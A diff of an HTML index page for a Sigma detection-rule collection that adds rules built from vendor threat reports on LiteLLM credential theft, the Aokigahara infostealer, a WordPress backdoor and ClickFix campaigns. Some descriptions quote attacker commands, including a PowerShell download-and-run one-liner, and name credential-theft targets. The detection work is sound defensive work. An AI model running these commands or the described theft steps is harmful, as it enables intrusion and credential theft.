@@ -4,9 +4,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>eeps-sigma · Sigma detections from primary threat research</title>
-<meta name="description" content="78 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
+<meta name="description" content="95 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
 <meta property="og:title" content="eeps-sigma · Sigma detections from primary threat research">
-<meta property="og:description" content="78 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
+<meta property="og:description" content="95 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
 <meta name="author" content="Esmond Er">
 <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -41,10 +41,10 @@
     </div>
     
     <dl class="stats">
-      <div><dt>Published rules</dt><dd>78</dd></div>
-      <div><dt>ATT&amp;CK techniques</dt><dd>55</dd></div>
+      <div><dt>Published rules</dt><dd>95</dd></div>
+      <div><dt>ATT&amp;CK techniques</dt><dd>63</dd></div>
       <div><dt>Platforms</dt><dd>5</dd></div>
-      <div><dt>Last updated</dt><dd class="dd-date">2026-10-23</dd></div>
+      <div><dt>Last updated</dt><dd class="dd-date">2026-10-24</dd></div>
     </dl>
   </div>
 </section>
@@ -84,7 +84,7 @@
   <div class="wrap">
     <h2>ATT&amp;CK coverage</h2>
     <p class="muted">Published rules by tactic, current ATT&amp;CK Enterprise release.</p>
-    <ul class="tactics"><li class=""><span class="t-name">Reconnaissance</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Resource Development</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Initial Access</span><span class="t-bar"><i style="width:27%"></i></span><span class="t-n">7</span></li><li class="on"><span class="t-name">Execution</span><span class="t-bar"><i style="width:42%"></i></span><span class="t-n">11</span></li><li class="on"><span class="t-name">Persistence</span><span class="t-bar"><i style="width:77%"></i></span><span class="t-n">20</span></li><li class="on"><span class="t-name">Privilege Escalation</span><span class="t-bar"><i style="width:12%"></i></span><span class="t-n">3</span></li><li class="on"><span class="t-name">Stealth</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">26</span></li><li class="on"><span class="t-name">Defense Impairment</span><span class="t-bar"><i style="width:19%"></i></span><span class="t-n">5</span></li><li class="on"><span class="t-name">Credential Access</span><span class="t-bar"><i style="width:15%"></i></span><span class="t-n">4</span></li><li class="on"><span class="t-name">Discovery</span><span class="t-bar"><i style="width:8%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Lateral Movement</span><span class="t-bar"><i style="width:15%"></i></span><span class="t-n">4</span></li><li class="on"><span class="t-name">Collection</span><span class="t-bar"><i style="width:4%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Command and Control</span><span class="t-bar"><i style="width:42%"></i></span><span class="t-n">11</span></li><li class="on"><span class="t-name">Exfiltration</span><span class="t-bar"><i style="width:4%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Impact</span><span class="t-bar"><i style="width:8%"></i></span><span class="t-n">2</span></li></ul>
+    <ul class="tactics"><li class=""><span class="t-name">Reconnaissance</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Resource Development</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Initial Access</span><span class="t-bar"><i style="width:24%"></i></span><span class="t-n">7</span></li><li class="on"><span class="t-name">Execution</span><span class="t-bar"><i style="width:52%"></i></span><span class="t-n">15</span></li><li class="on"><span class="t-name">Persistence</span><span class="t-bar"><i style="width:83%"></i></span><span class="t-n">24</span></li><li class="on"><span class="t-name">Privilege Escalation</span><span class="t-bar"><i style="width:14%"></i></span><span class="t-n">4</span></li><li class="on"><span class="t-name">Stealth</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">29</span></li><li class="on"><span class="t-name">Defense Impairment</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">5</span></li><li class="on"><span class="t-name">Credential Access</span><span class="t-bar"><i style="width:21%"></i></span><span class="t-n">6</span></li><li class="on"><span class="t-name">Discovery</span><span class="t-bar"><i style="width:7%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Lateral Movement</span><span class="t-bar"><i style="width:14%"></i></span><span class="t-n">4</span></li><li class="on"><span class="t-name">Collection</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">5</span></li><li class="on"><span class="t-name">Command and Control</span><span class="t-bar"><i style="width:45%"></i></span><span class="t-n">13</span></li><li class="on"><span class="t-name">Exfiltration</span><span class="t-bar"><i style="width:7%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Impact</span><span class="t-bar"><i style="width:7%"></i></span><span class="t-n">2</span></li></ul>
   </div>
 </section>
 
@@ -109,6 +109,16 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-22</span>
       </a>
+      <a class="rule-row" href="rules/proc_creation_lnx_python_inline_litellm_proxy_db_credential_dump.html" data-level="high" data-product="linux"
+         data-search="inline python command reading litellm proxy database credential tables - linux t1059.006 t1005 process_creation detects an inline python command (python -c) that runs a prisma raw query against the litellm proxy database tables that hold provider credentials and model settings. microsoft reports that the privcollect collector shipped in the trojanized litellm 1.107.0 package &quot;starts a python child using prisma to read selected fields from two proxy database tables&quot; (litellm_credentialstable.credential_values and litellm_proxymodeltable.litellm_params). the rule uses the command-line terms from microsoft&#x27;s own hunting query (&quot;-c &quot;, &quot;query_raw&quot; and the table names). the litellm proxy reads these tables inside its own long-running process, not through a separate python -c child, so a match is unusual. the rule keys on the query behaviour, not on file hashes or the exfiltration domain, so it should still match if the collector is repackaged.">
+        <span class="rr-main">
+          <span class="rr-title">Inline Python Command Reading LiteLLM Proxy Database Credential Tables - Linux</span>
+          <span class="rr-sub">Linux · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1059.006</span> <span class="chip">T1005</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/file_event_lnx_peoplesoft_war_directory_jsp_write.html" data-level="high" data-product="linux"
          data-search="jsp file written to oracle peoplesoft web application archive directory - linux t1505.003 file_event detects creation of jsp or jspx files inside the peoplesoft psemhub.war or portal.war web application directories on linux (&lt;ps_cfg_home&gt;/webserv/&lt;domain&gt;/applications/peoplesoft/psemhub.war/). unc6240 (shinyhunters) exploited psemhub (cve-2026-35273), wrote web shells (x.jsp, u.jsp and sequentially numbered jsps) and other unexpected files such as tunnel.jsp and tunnel.jspx into psemhub.war. sekoia also reports shinyhunters &quot;deploying small jsp backdoors on compromised peoplesoft servers to maintain persistence&quot; (orau.jsp, webpack.jsp), without giving their directory.">
         <span class="rr-main">
@@ -128,6 +138,16 @@
         <span class="rr-tech"><span class="chip">T1219</span></span>
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-09-26</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_lnx_openssl_encrypt_in_pc_e_staging_directory.html" data-level="high" data-product="linux"
+         data-search="openssl encryption of data staged in .pc_e_ temporary directory - linux t1560.001 process_creation detects openssl encrypting files (enc, or pkeyutl/rsautl key wrapping) inside a temporary directory whose name contains &quot;.pc_e_&quot;. microsoft reports that the privcollect collector in the trojanized litellm 1.107.0 package encrypts collected secrets with openssl (aes-256-cbc for the data and an rsa public key to wrap the session key) before exfiltration, and that &quot;the openssl backend creates temporary directories beginning with .pc_e_&quot;. the terms come from microsoft&#x27;s hunting query (filename openssl, processcommandline contains &quot;.pc_e_&quot; and &quot; enc &quot;). the &quot;.pc_e_&quot; prefix is chosen by the malware, so the rule only finds this collector and close variants. encryption with a public key just before exfiltration is the behaviour; the directory prefix keeps false positives low.">
+        <span class="rr-main">
+          <span class="rr-title">OpenSSL Encryption Of Data Staged In .pc_e_ Temporary Directory - Linux</span>
+          <span class="rr-sub">Linux · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1560.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
       </a>
       <a class="rule-row" href="rules/proc_creation_lnx_suid_bash_copy_tourch_execution.html" data-level="high" data-product="linux"
          data-search="suid bit set on hidden file or .tourch suid bash copy executed - linux t1548.001 t1564.001 process_creation detects either of two steps of a hidden suid shell backdoor: (1) chmod setting the suid bit (u+s) on a hidden dot-file, and (2) execution of a binary named .tourch. unit 42 reports that cl-unk-1211 copied /bin/bash to a hidden file named .tourch and set the suid bit on it (&quot;modified its permissions using the command chmod u+s&quot;), noting: &quot;because .tourch is actually the /bin/bash binary, this allowed the attackers to execute bash commands as root.&quot; the .tourch name is attacker-chosen (a hidden misspelling of &quot;touch&quot;); the chmod branch covers the same technique under any hidden file name.">
@@ -219,6 +239,36 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-09-26</span>
       </a>
+      <a class="rule-row" href="rules/proxy_aokigahara_gate_endpoint_with_microsoft_cryptoapi_user_agent.html" data-level="high" data-product="web"
+         data-search="request to infostealer gate upload endpoint with microsoft-cryptoapi user-agent t1071.001 t1041 proxy detects http requests to /gate/handshake, /gate/chunk or /gate/complete sent with the user-agent microsoft-cryptoapi/10.0. check point reports that the aokigahara infostealer uses three /gate endpoints: handshake &quot;establishes an upload session by sending the client’s raw 32-byte x25519 public key&quot;, chunk &quot;uploads collected information packaged into zip archives and encrypted using aes-256-gcm&quot;, and complete &quot;signals the end of the upload phase by sending the eight-byte marker `complete`&quot;; &quot;the latest analyzed samples use `microsoft-cryptoapi/10.0` for communication with the server.&quot; windows uses microsoft-cryptoapi/10.0 for its own certificate revocation and trust-list downloads, so the user agent alone is not suspicious; the rule requires both the user agent and one of the three gate paths. if c2 traffic is https the rule needs proxy or tls-inspection logs that record the uri. earlier samples used a different user agent and will not match.">
+        <span class="rr-main">
+          <span class="rr-title">Request To Infostealer Gate Upload Endpoint With Microsoft-CryptoAPI User-Agent</span>
+          <span class="rr-sub">Web server · proxy</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1071.001</span> <span class="chip">T1041</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
+      <a class="rule-row" href="rules/web_wordpress_trust_graft_backdoor_wm2_request_parameters.html" data-level="high" data-product="web"
+         data-search="wordpress trust#graft backdoor control parameters in web request t1505.003 webserver detects web requests whose query string contains the control parameters or the hardcoded token of the trust#graft wordpress backdoor (&quot;web media optimizer&quot; / wmedia-recovery.php). securonix reports that &quot;a hardcoded token can trigger wp_set_auth_cookie for the first administrator account&quot;, which gives passwordless admin access, and that the backdoor can also replace its stored controller url and clear its cache. securonix&#x27;s hunting query looks for request urls containing &quot;wm2_a&quot;, &quot;wm2_src&quot;, &quot;wm2_hc&quot; or &quot;m2ws8mr4yp1ql7xc5vb3dg9jk6th2z&quot;. the report does not say which parameter carries the token, so the rule matches each string anywhere in the query. a match means someone tried to use the backdoor. the plugin may not be installed on that site. this is a tool-level detection: an operator who rebuilds the plugin with new parameter names will not match.">
+        <span class="rr-main">
+          <span class="rr-title">WordPress TRUST#GRAFT Backdoor Control Parameters In Web Request</span>
+          <span class="rr-sub">Web server · webserver</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1505.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
+      <a class="rule-row" href="rules/pipe_created_win_aokigahara_akg_named_pipe.html" data-level="high" data-product="windows"
+         data-search="aokigahara infostealer akg_ named pipe created t1559 pipe_created detects creation of or connection to a named pipe called akg_ followed by two hexadecimal values separated by an underscore. check point&#x27;s yara rule for the aokigahara infostealer contains the format string $str5 = &quot;\\\\.\\pipe\\akg_%lx_%lx&quot;, which builds a pipe name of the form \\.\pipe\akg_&lt;hex&gt;_&lt;hex&gt;. sysmon records the pipe name without the \\.\pipe prefix (\akg_&lt;hex&gt;_&lt;hex&gt;), and %lx produces lower-case hexadecimal, which the regex matches. the report does not describe the purpose of the pipe; the technique mapping is an analyst inference.">
+        <span class="rr-main">
+          <span class="rr-title">Aokigahara Infostealer Akg_ Named Pipe Created</span>
+          <span class="rr-sub">Windows · pipe created</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1559</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_explorer_cmd_caret_escaped_for_loop_clickfix.html" data-level="high" data-product="windows"
          data-search="caret-escaped cmd for-loop launched from explorer - clickfix t1204.004 t1027.010 process_creation detects cmd.exe started directly by explorer.exe (as happens when a user pastes a command into the windows run dialog) whose command line contains a &quot;for /f&quot; loop together with a caret inserted inside a keyword (e.g. s^t^a^r^t, f^^i^^n^^g^^e^^r), or the clickfix lure padding string &quot;p_u_s_h----t_h_e----_e_n_t_e_r_----k_e_y&quot;. huntress reports a clickfix attack where the pasted command, parent explorer.exe, was &quot;c:\windows\system32\cmd.exe&quot; /c s^t^a^r^t &quot;&quot; /min for /f &quot;delims=@&quot; %k in (...,f^^i^^n^^g^^e^^r unynqaplrs@f^^i^^n^^g^^e^^r^^...) do %k, i.e. a for /f loop that executes each line returned by finger.exe as a command. the carets are present in the raw process command line; the contiguous &quot;start ... for /f ... finger ...&quot; string shown by huntress is their de-obfuscated rendering and does not appear in telemetry, so this rule matches the loop keyword plus an in-keyword caret (one or two carets between two letters) rather than the stripped string. ordinary metacharacter escaping such as &#x27;^|&#x27; or &#x27;^&amp;&#x27; is not matched. known evasion: obfuscating the loop keyword itself (e.g. f^or /f) or using extra whitespace (e.g. &quot;for  /f&quot;) breaks the &#x27;for /f&#x27; literal; the lure branch and the complementary sigmahq rules still apply in that case. complementary sigmahq rules cover the later stages: &quot;finger.exe execution&quot; (proc_creation_win_finger_execution), &quot;network connection initiated via finger.exe&quot; and the generic &quot;potential dosfuscation activity&quot; (&#x27;^^&#x27;).">
         <span class="rr-main">
@@ -249,6 +299,26 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-23</span>
       </a>
+      <a class="rule-row" href="rules/proc_creation_win_programdata_executable_with_hex_key_and_dat_file_argument.html" data-level="high" data-product="windows"
+         data-search="executable in programdata run with 32-hex key and .dat file arguments t1620 process_creation detects a process started from c:\programdata\ whose command line passes a 32-character hexadecimal string followed by a path to a .dat file. symantec reports that swallowtail used an undocumented loader, ld.exe, that is &quot;a reflective loader: it takes an encrypted file and a key as arguments, decrypts the file in memory&quot; and &quot;calls an exported function named executeloader&quot;, run as &quot;c:\programdata\ld.exe de063cf3f2e2a83e7b1a277c052a340e c:\programdata\events.dat&quot;. the rule keys on the argument pattern (hex key, then encrypted .dat file) and the programdata location, not on the ld.exe or events.dat names or the key value. a quoted .dat path without spaces is matched, but a quoted .dat path containing spaces will not match; a key that is not 32 hex characters, or arguments in the reverse order, will not match.">
+        <span class="rr-main">
+          <span class="rr-title">Executable In ProgramData Run With 32-Hex Key And .Dat File Arguments</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1620</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
+      <a class="rule-row" href="rules/file_event_win_file_created_in_root_microsoft_vault_folder.html" data-level="high" data-product="windows"
+         data-search="file created in root-level c:\microsoft\vault folder t1115 file_event detects creation of a file beneath c:\microsoft\vault, a root-level folder that mimics a windows component location. check point reports that the aokigahara infostealer&#x27;s clipper_drop handler &quot;drops a clipper component beneath `c:\microsoft\vault` using embedded data&quot;; &quot;the handler itself does not access the clipboard; it deploys the component responsible for clipboard manipulation.&quot; assumption, not from the report: windows keeps its genuine vault folders under user and programdata profile paths (for example %localappdata%\microsoft\vault), not at c:\microsoft\, so the rule anchors on the drive-root path. the report does not name the dropped file, so the rule matches any file in the folder.">
+        <span class="rr-main">
+          <span class="rr-title">File Created In Root-Level C:\Microsoft\Vault Folder</span>
+          <span class="rr-sub">Windows · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1115</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_crossweb_ex_service_spawns_fsquirt.html" data-level="high" data-product="windows"
          data-search="fsquirt.exe spawned by inisafe crossweb ex service t1203 t1055 process_creation detects the windows bluetooth file transfer wizard fsquirt.exe started by inisafecrosswebexsvc.exe, the service process of the inisafe crossweb ex security plugin widely deployed in south korea. kaspersky reports in operation flashhole that &quot;the legitimate windows binary fsquirt.exe was executed under the crossweb ex process and injected with shellcode&quot; carrying the lazarus techhub backdoor, and that &quot;the parent process, inisafecrosswebexsvc.exe, originates from the installation bundle&quot;. the crossweb ex service has no reason to launch the bluetooth transfer wizard, so this parent-child pair indicates exploitation of the plugin followed by process injection.">
         <span class="rr-main">
@@ -278,6 +348,16 @@
         <span class="rr-tech"><span class="chip">T1036.005</span></span>
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-23</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_msedge_offscreen_window_or_base64_data_uri_launch.html" data-level="high" data-product="windows"
+         data-search="microsoft edge launched off-screen with 1x1 window or base64 html data uri t1564.003 process_creation detects msedge.exe started with the window position 10000,10000 together with a 1x1 window size or an inline base64 data:text/html uri. symantec reports that hosts infected with swallowtail&#x27;s hookedge backdoor &quot;fetch tasks using a hidden, off-screen instance of the microsoft edge browser&quot;, launched by a batch script as &quot;start &quot;&quot; msedge.exe --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors&quot; and &quot;passing it an inline, base64-encoded javascript payload rather than a url&quot; (&quot;data:text/html;base64,&quot;). a window placed far off-screen at 1x1 pixels hides the browser from the user while it acts as the backdoor&#x27;s http client. the rule requires the off-screen position plus one of the other two arguments, so a different window size or a url argument still matches through the other branch.">
+        <span class="rr-main">
+          <span class="rr-title">Microsoft Edge Launched Off-Screen With 1x1 Window Or Base64 HTML Data URI</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1564.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
       </a>
       <a class="rule-row" href="rules/file_event_win_msadc_inc_created_in_common_files_msadc.html" data-level="high" data-product="windows"
          data-search="msadc.inc created in common files msadc folder t1036.005 file_event detects creation of the file msadc.inc in the mdac folder c:\program files\common files\system\msadc\. kaspersky reports that the lazarus clienthub backdoor reads &quot;the external configuration file c:\program files\common files\system\msadc\msadc.inc&quot;, hiding its configuration among the legitimate microsoft data access components files. msadc.inc is not a file mdac installs (the folder&#x27;s legitimate include files are adcvbs.inc and adcjavas.inc), so the rule matches that exact file name rather than any .inc file in the folder.">
@@ -339,6 +419,16 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-05</span>
       </a>
+      <a class="rule-row" href="rules/proc_creation_win_powershell_payload_from_temporarydoc_txt.html" data-level="high" data-product="windows"
+         data-search="powershell executing payload from temporarydoc.txt t1059.001 process_creation detects powershell started with a command line that references temporarydoc.txt. eset reports that &quot;a scheduled task named pdfopentask was executed on one machine in the target organization&quot; and that &quot;it executed a powershell payload from %temp%\temporarydoc.txt&quot;. eset does not publish the exact command line, so the rule only requires the file name to appear in it (e.g. a get-content/invoke-expression read-and-invoke launch; an -encodedcommand launch that hides the file name would not match).">
+        <span class="rr-main">
+          <span class="rr-title">PowerShell Executing Payload From Temporarydoc.txt</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1059.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_powershell_irm_decimal_ip_host.html" data-level="high" data-product="windows"
          data-search="powershell invoke-restmethod to decimal-encoded ip host t1105 t1059.001 process_creation detects a command line in which powershell&#x27;s invoke-restmethod (alias irm) targets a host written as a single decimal integer instead of a dotted ipv4 address (8 to 10 digits, the range of a decimal-encoded ipv4 address), e.g. &quot;irm 1614733393/12&quot;. huntress reports an unattributed clickfix campaign in which the pasted command was powershell.exe -executionpolicy bypass &quot;irm 1614733393/12 | out-file $env:temp\1777.ps1;&amp; $env:temp\1777.ps1&quot;, noting that the host is written as a decimal number rather than a dotted ip. sigmahq &quot;obfuscated ip download activity&quot; matches the reported sample only via its octal clause, because the leading digits happen to be 0-7; it does not match decimal hosts generally. sigmahq &quot;suspicious invoke-webrequest execution with directip&quot; requires &#x27;://&#x27; in the command line.">
         <span class="rr-main">
@@ -368,6 +458,16 @@
         <span class="rr-tech"><span class="chip">T1572</span></span>
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-01</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_renamed_jcef_helper_execution.html" data-level="high" data-product="windows"
+         data-search="renamed jcef helper execution t1036.003 process_creation detects execution of a binary whose pe originalfilename is jcef_helper.exe (the java chromium embedded framework helper) but whose on-disk name is different. kaspersky reports that the oxidllrunner loader used alongside the blackx uefi bootkit &quot;is loaded by the legitimate file googleupdate.exe (original filename: jcef_helper.exe&quot;, and that the side-loaded dll then &quot;decrypts the contents of the file v8_context_snapshot.bin, which resides in the same folder&quot;. kaspersky attributes the intrusion to apt41 with medium confidence. the attacker renamed a legitimate jcef helper to googleupdate.exe to pass it off as an updater and use it as the side-loading host, so the rule keys on the name mismatch rather than on the googleupdate.exe name or the hash. assumption: the report&#x27;s &quot;original filename&quot; is the pe version-resource originalfilename that sysmon eid 1 and defender record as originalfilename. if the binary carries no version resource the rule will not fire.">
+        <span class="rr-main">
+          <span class="rr-title">Renamed JCEF Helper Execution</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1036.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
       </a>
       <a class="rule-row" href="rules/registry_set_win_run_key_value_launching_runtimebroker_exe.html" data-level="high" data-product="windows"
          data-search="run key value launching runtimebroker.exe t1547.001 registry_set detects a currentversion\run value whose data points to runtimebroker.exe, or the run value name &quot;microsoftruntime&quot;. unit 42 reports that shelbyloader v2 (blinder tunnel campaign) copies a renamed benign microsoft binary, runtimebroker.exe, into the deceptive folder %localappdata%\microsoft\runtimebrokers and persists via &quot;hkcu\software\microsoft\windows\currentversion\run\microsoftruntime&quot; pointing to &quot;%localappdata%\microsoft\runtimebrokers\runtimebroker.exe&quot;. the genuine windows runtime broker is started on demand by the system (dcom) and is not registered as a run-key autostart, so any run value launching a binary named runtimebroker.exe is anomalous. sysmon logs hkcu as hku\&lt;sid&gt;, hence the contains/endswith matching on the key path below the hive. the report states the value is re-written on a 120-second interval, so expect repeated events per host; deduplicate on host and targetobject.">
@@ -418,6 +518,16 @@
         <span class="rr-tech"><span class="chip">T1053.005</span></span>
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-04</span>
+      </a>
+      <a class="rule-row" href="rules/win_security_scheduled_task_pdfopentask_created.html" data-level="high" data-product="windows"
+         data-search="scheduled task pdfopentask created or updated t1053.005 security detects creation or update (security events 4698/4702) of a scheduled task named pdfopentask. eset reports, for the intrusion it investigated at the target organization, that &quot;a scheduled task named pdfopentask was executed on one machine in the target organization&quot; and that &quot;it executed a powershell payload from %temp%\temporarydoc.txt&quot;. the task name is an attacker-chosen artifact; requires &quot;audit other object access events&quot; to be enabled.">
+        <span class="rr-main">
+          <span class="rr-title">Scheduled Task PdfOpenTask Created Or Updated</span>
+          <span class="rr-sub">Windows · security</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1053.005</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-24</span>
       </a>
       <a class="rule-row" href="rules/win_security_scheduled_task_scautorepairevery2min_created.html" data-level="high" data-product="windows"
          data-search="scheduled task scautorepairevery2min or scautofix script created t1053.005 security detects creation (security event 4698) of a scheduled task named scautorepairevery2min, or of any scheduled task whose action references the script scautofix.ps1. huntress observed a phishing campaign that abused public microsoft power bi dashboards to deliver rogue screenconnect clients; in one incident &quot;a scheduled task (scautorepairevery2min) was created and configured to run the script (scautofix.ps1)&quot;, the powershell script that was deployed from the temp directory and installed a second, redundant screenconnect instance. both values are attacker-chosen artifacts. requires &quot;audit other object access events&quot; to be enabled.">
@@ -559,6 +669,26 @@
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-10-16</span>
       </a>
+      <a class="rule-row" href="rules/file_event_lnx_php_file_created_in_wordpress_mu_plugins.html" data-level="medium" data-product="linux"
+         data-search="php file created in wordpress must-use plugins directory - linux t1505 file_event detects creation of a .php file in the wordpress must-use plugins directory (wp-content/mu-plugins/). wordpress loads every php file in this directory on each request. these plugins cannot be turned off from the admin plugins page, which makes the directory a good place to hide persistence. securonix reports that in the trust#graft campaign the malicious &quot;web media optimizer&quot; plugin, once activated, &quot;attempts to create the must-use plugin directory and copies itself to wmedia-recovery.php&quot;, which securonix names as wp-content/mu-plugins/wmedia-recovery.php. the rule matches any php file in that directory, not only the trust#graft file name, so renamed copies also match.">
+        <span class="rr-main">
+          <span class="rr-title">PHP File Created In WordPress Must-Use Plugins Directory - Linux</span>
+          <span class="rr-sub">Linux · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1505</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
+      <a class="rule-row" href="rules/file_event_lnx_python_sitecustomize_py_created.html" data-level="medium" data-product="linux"
+         data-search="python sitecustomize.py startup hook file created - linux t1546.018 file_event detects creation of a sitecustomize.py file by a process other than the system package manager. python imports sitecustomize automatically while the site module initializes, so code in this file runs every time the interpreter starts. microsoft reports that the trojanized litellm 1.107.0 wheel placed cook.pth, cook.py and sitecustomize.py in the python library directory (through litellm-1.107.0.data/purelib/, outside the litellm package folder). microsoft notes that &quot;this placement enabled execution through python&#x27;s normal site initialization&quot;. in that campaign, sitecustomize.py held the remote loader. new .pth files in site-packages are already covered by the sigmahq threat-hunting rule &quot;python path configuration file creation - linux&quot;; this rule covers the sitecustomize.py hook, which that rule does not. assumptions: the package-manager filter uses common linux package manager binary names, and the apm filters use the default package layouts of datadog ddtrace, opentelemetry python auto-instrumentation, new relic and the jetbrains pycharm debugger helpers, which ship their own sitecustomize.py. none of these values come from the report. note: on rhel-family systems yum/dnf run as python, so the package-manager filter by image may not match there.">
+        <span class="rr-main">
+          <span class="rr-title">Python sitecustomize.py Startup Hook File Created - Linux</span>
+          <span class="rr-sub">Linux · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1546.018</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-24</span>
+      </a>
       <a class="rule-row" href="rules/file_event_lnx_solarwinds_statuslog_txt_created.html" data-level="medium" data-product="linux"
          data-search="solarwinds.statuslog.txt credential log created - linux t1056.003 t1036.005 file_event detects creation of a file named solarwinds.statuslog.txt on a linux host. unit 42 reports that cl-unk-1211 inserted a credential logger into a php login page and that &quot;the attackers named the log file solarwinds.statuslog.txt, to mimic legitimate solarwinds activity in the environment.&quot; the name is attacker-chosen; the writing process is typically the php worker or web server user. the report does not give the directory, so the rule matches the file name anywhere.">
         <span class="rr-main">
@@ -619,6 +749,16 @@
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-10-17</span>
       </a>
+      <a class="rule-row" href="rules/file_access_win_ai_assistant_cloud_cli_auth_token_files_accessed_by_uncommon_process.html" data-level="medium" data-product="windows"
+         data-search="ai assistant or developer cli auth token files accessed by uncommon process t1528 t1552.001 file_access detects a process other than the owning tool accessing authentication or token files of ai coding assistants and ai-enabled developer clis (claude code credentials, codex auth.json, kiro auth token and profile, github copilot hosts.json, gemini cli workspace token and master key, amazon q data store). check point reports that the aokigahara infostealer&#x27;s &quot;aisessions&quot; handler &quot;targets ai applications and development tools&quot; and collects &quot;authentication files, session data, and configuration files associated with ai-assisted development and cloud environments&quot;; &quot;the paths below identify the handler&#x27;s collection targets.&quot; the report gives each path relative to an unnamed base folder (%s), so the rule matches the verbatim path suffixes only. for claude code it matches a credentials.json file under a .claude folder, which also covers the dot-prefixed .credentials.json name. state databases shared by many editor processes (state.vscdb, storage.json) and aws cli credential files are left out because every ide, sdk and extension reads them. owner filters are assumed default image names, not from the report: claude.exe, codex.exe, kiro.exe, code.exe, cursor.exe, windsurf.exe and amazon q q.exe/qchat.exe under a user profile or program files. an optional filter excludes node.exe, which runs npm-installed gemini cli, copilot cli and codex; removing it restores visibility of node.js-based stealers at the cost of more noise. a stealer that renames itself to an owner image name evades the rule.">
+        <span class="rr-main">
+          <span class="rr-title">AI Assistant Or Developer CLI Auth Token Files Accessed By Uncommon Process</span>
+          <span class="rr-sub">Windows · file access</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1528</span> <span class="chip">T1552.001</span></span>
